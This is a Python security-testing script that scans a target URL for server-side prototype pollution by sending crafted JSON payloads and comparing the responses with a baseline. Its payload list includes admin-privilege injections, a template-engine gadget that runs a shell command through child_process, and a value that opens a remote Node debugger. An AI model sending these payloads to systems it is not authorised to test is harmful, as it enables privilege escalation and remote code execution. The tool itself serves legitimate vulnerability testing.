#!/usr/bin/env python3
"""
proto_pollution_scanner.py — Server-side prototype pollution scanner.

Sends prototype-polluting payloads to endpoints and checks for behavioral
changes (status codes, content-type shifts, JSON spacing, response body diffs).

Usage:
  python3 tools/proto_pollution_scanner.py --url https://api.example.com/endpoint
  python3 tools/proto_pollution_scanner.py --url https://api.example.com/endpoint --dry-run
  python3 tools/proto_pollution_scanner.py --url https://api.example.com/endpoint --rate 0.5 --json
"""

import argparse
import json
import sys
import time
import urllib.request
import urllib.error

# ─── Color codes ──────────────────────────────────────────────────────────────
RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BLUE   = "\033[94m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
RESET  = "\033[0m"

FINDINGS = []

# ─── Pollution vectors ────────────────────────────────────────────────────────

PROTO_VECTORS = [
    ("__proto__-isAdmin",          {"__proto__": {"isAdmin": True}}),
    ("__proto__-admin",            {"__proto__": {"admin": True}}),
    ("__proto__-role",             {"__proto__": {"role": "admin"}}),
    ("__proto__-debug",            {"__proto__": {"debug": True, "verbose": True}}),
    ("__proto__-outputFunctionName", {"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');x"}}),
    ("__proto__-sandboxed",        {"__proto__": {"sandboxed": False}}),
    ("__proto__-shell",            {"__proto__": {"shell": "node", "NODE_OPTIONS": "--inspect=0.0.0.0"}}),
    ("constructor-prototype",      {"constructor": {"prototype": {"isAdmin": True}}}),
    ("constructor-proto",          {"constructor": {"__proto__": {"isAdmin": True}}}),
    ("__proto__-toString",         {"__proto__": {"toString": "polluted"}}),
    ("__proto__-hasOwnProperty",   {"__proto__": {"hasOwnProperty": True}}),
    ("__proto__-jsonSpaces",       {"__proto__": {"jsonSpaces": 10}}),
    ("__proto__-space",            {"__proto__": {"space": 10}}),
    ("__proto__-status",           {"__proto__": {"status": 200}}),
    ("__proto__-statusCode",       {"__proto__": {"statusCode": 200}}),
    ("__proto__-exposedHeaders",   {"__proto__": {"exposedHeaders": ["X-Polluted"]}}),
    ("nested-proto",               {"a": {"b": {"__proto__": {"isAdmin": True}}}}),
    ("array-proto",                [{"__proto__": {"isAdmin": True}}]),
]

HTTP_METHODS = ["POST", "PUT", "PATCH"]


# ─── HTTP Helpers ─────────────────────────────────────────────────────────────

def http_request(url: str, method: str, body: dict | list,
                  timeout: int = 10) -> tuple[int, dict, str]:
    data = json.dumps(body).encode()
    req = urllib.request.Request(
        url,
        data=data,
        headers={
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0",
            "Accept": "application/json",
        },
        method=method,
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode(errors="replace")
            headers = dict(r.headers)
            return r.status, headers, raw
    except urllib.error.HTTPError as e:
        raw = e.read().decode(errors="replace")
        return e.code, dict(e.headers), raw
    except Exception as e:
        return 0, {}, str(e)


def record(test: str, result: str, detail: str, severity: str = "HIGH"):
    FINDINGS.append({"test": test, "result": result, "detail": detail, "severity": severity})
    color = RED if result == "VULNERABLE" else (YELLOW if result == "INTERESTING" else GREEN)
    print(f"  {color}[{result}]{RESET} {test}")
    if detail:
        print(f"    {DIM}{detail}{RESET}")


def detect_pollution(baseline_status: int, baseline_body: str, baseline_hdrs: dict,
                      test_status: int, test_body: str, test_hdrs: dict,
                      test_name: str, method: str):
    """Heuristic diff of baseline vs polluted response."""
    signals = []

    if test_status != baseline_status:
        signals.append(f"status changed {baseline_status}→{test_status}")

    # Check for JSON spacing change (jsonSpaces pollution)
    if baseline_body.strip().startswith("{") and test_body.strip().startswith("{"):
        if "    " in test_body and "    " not in baseline_body:
            signals.append("JSON indentation changed (jsonSpaces pollution confirmed)")

    # Check for new headers
    for h in ("x-polluted", "x-admin", "x-debug"):
        if h in {k.lower() for k in test_hdrs}:
            signals.append(f"new header detected: {h}")

    # Check response body for pollution markers
    for marker in ('"isAdmin":true', '"admin":true', '"role":"admin"', '"polluted"'):
        if marker in test_body and marker not in baseline_body:
            signals.append(f"body contains pollution marker: {marker}")

    # Check for unexpected error disappearance
    if baseline_status in (400, 401, 403) and test_status == 200:
        signals.append("auth/validation bypass (403→200)")

    if signals:
        record(f"{method}:{test_name}", "INTERESTING",
               " | ".join(signals))
    else:
        detail = f"HTTP {test_status}" + (f" (was {baseline_status})" if test_status != baseline_status else "")
        record(f"{method}:{test_name}", "BLOCKED", detail)


# ─── Main scanner ─────────────────────────────────────────────────────────────

def baseline_request(url: str, method: str) -> tuple[int, dict, str]:
    """Send a clean baseline request with a benign payload."""
    return http_request(url, method, {"name": "test", "value": "baseline"})


def run_tests(url: str, rate: float, dry_run: bool):
    for method in HTTP_METHODS:
        print(f"\n{BOLD}[{method}] Testing {len(PROTO_VECTORS)} pollution vectors{RESET}")

        if not dry_run:
            b_status, b_hdrs, b_body = baseline_request(url, method)
            print(f"  {DIM}Baseline: HTTP {b_status}{RESET}")
            time.sleep(1.0 / rate)
        else:
            b_status, b_hdrs, b_body = 200, {}, "{}"

        for name, payload in PROTO_VECTORS:
            preview = json.dumps(payload)[:80]
            if dry_run:
                print(f"  {CYAN}[DRY-RUN]{RESET} {method} {name}")
                print(f"    {DIM}Payload: {preview}...{RESET}")
                continue
            time.sleep(1.0 / rate)
            t_status, t_hdrs, t_body = http_request(url, method, payload)
            detect_pollution(b_status, b_body, b_hdrs,
                              t_status, t_body, t_hdrs,
                              name, method)


# ─── Main ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="Server-side prototype pollution scanner")
    parser.add_argument("--url",     required=True, help="Target endpoint URL")
    parser.add_argument("--rate",    type=float, default=1.0, metavar="REQ/S",
                        help="Request rate limit in req/sec (default: 1.0)")
    parser.add_argument("--dry-run", action="store_true",
                        help="Show payloads without sending requests")
    parser.add_argument("--json",    action="store_true", dest="json_output",
                        help="Output results as JSON")
    args = parser.parse_args()

    print(f"\n{BOLD}{BLUE}╔══════════════════════════════════════╗")
    print(f"║   Prototype Pollution Scanner        ║")
    print(f"╚══════════════════════════════════════╝{RESET}")
    print(f"  Target  : {CYAN}{args.url}{RESET}")
    print(f"  Vectors : {len(PROTO_VECTORS)} × {len(HTTP_METHODS)} methods = "
          f"{len(PROTO_VECTORS) * len(HTTP_METHODS)} requests")
    print(f"  Rate    : {args.rate} req/sec")
    if args.dry_run:
        print(f"  Mode    : {YELLOW}DRY-RUN (no requests sent){RESET}")

    print(f"\n{BOLD}Pollution vectors:{RESET}")
    for name, payload in PROTO_VECTORS:
        print(f"  {DIM}{name:40s} {json.dumps(payload)[:60]}{RESET}")

    run_tests(args.url, args.rate, args.dry_run)

    interesting = [f for f in FINDINGS if f["result"] in ("VULNERABLE", "INTERESTING")]
    print(f"\n{BOLD}{'─'*50}{RESET}")
    print(f"  Tests run   : {len(FINDINGS)}")
    if interesting:
        print(f"  {YELLOW}Interesting : {len(interesting)}{RESET}")
        for f in interesting:
            print(f"    {YELLOW}→{RESET} {f['test']}: {f['detail']}")
    else:
        print(f"  {GREEN}No anomalies detected{RESET}")

    if args.json_output:
        print(json.dumps({"url": args.url, "findings": FINDINGS}, indent=2))


if __name__ == "__main__":
    main()
